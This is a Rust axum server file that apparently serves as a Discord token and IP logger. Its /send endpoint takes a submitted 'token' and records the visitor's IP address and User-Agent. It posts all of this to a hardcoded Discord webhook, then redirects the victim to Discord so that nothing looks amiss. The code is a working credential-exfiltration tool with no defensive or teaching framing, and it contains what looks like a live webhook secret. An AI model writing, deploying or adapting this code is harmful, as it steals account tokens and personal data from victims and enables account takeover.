use axum::{
    extract::{Json, State},
    http::{HeaderMap, StatusCode},
    response::{IntoResponse, Redirect},
    routing::post,
    Router,
};
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::{env, net::SocketAddr, sync::Arc};
use tokio;

#[derive(Deserialize)]
struct Payload {
    token: Option<String>,
}

#[derive(Serialize)]
struct DiscordPayload {
    content: String,
}

// 🔹 Helper Function to Get IP from Headers
fn get_ip(headers: &HeaderMap) -> String {
    headers
        .get("x-forwarded-for")
        .and_then(|value| value.to_str().ok())
        .unwrap_or("Unknown IP")
        .to_string()
}

// 🔹 Backend Handler (Processes Everything Server-Side)
async fn handle_request(
    headers: HeaderMap,
    Json(payload): Json<Payload>,
) -> impl IntoResponse {
    let webhook_url = "https://discord.com/api/webhooks/1332416584156839996/uFyfp1H5vP8hxWwjBJpisON4vSOJO3OgVFJkapWlzbVFRSsy_htVi5F0eNGypyNN7IBL";

    let client = Client::new();

    // 🔹 Get User's IP Address
    let user_ip = get_ip(&headers);

    // 🔹 Get User-Agent as a Fake "Timezone" (Since there's no direct timezone header)
    let user_agent = headers
        .get("user-agent")
        .and_then(|h| h.to_str().ok())
        .unwrap_or("Unknown User-Agent")
        .to_string();

    // 🔹 Extract Token (If Available)
    let token = payload.token.unwrap_or("No Token".to_string());

    // 🔹 Block Messages Containing `@everyone` or `@here`
    let message = format!(
        "Logged Info\nIP: {}\nUser-Agent: {}\nToken: {}",
        user_ip, user_agent, token
    );
    if message.contains("@everyone") || message.contains("@here") {
        return (StatusCode::FORBIDDEN, "Blocked message: contains @everyone or @here").into_response();
    }

    // 🔹 Send Data to Discord
    let discord_payload = DiscordPayload { content: message };
    if let Err(e) = client.post(webhook_url).json(&discord_payload).send().await {
        eprintln!("Failed to send message: {}", e);
        return (StatusCode::INTERNAL_SERVER_ERROR, "Failed to send message").into_response();
    }

    // 🔹 Redirect the User
    Redirect::to("https://discord.com/channels/@me").into_response()
}

#[tokio::main]
async fn main() {
    let app = Router::new().route("/send", post(handle_request));

    let port = env::var("PORT").unwrap_or_else(|_| "8080".to_string());
    let addr: SocketAddr = format!("0.0.0.0:{}", port).parse().unwrap();

    println!("Listening on {}", addr);

    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app.into_make_service()).await.unwrap();
}
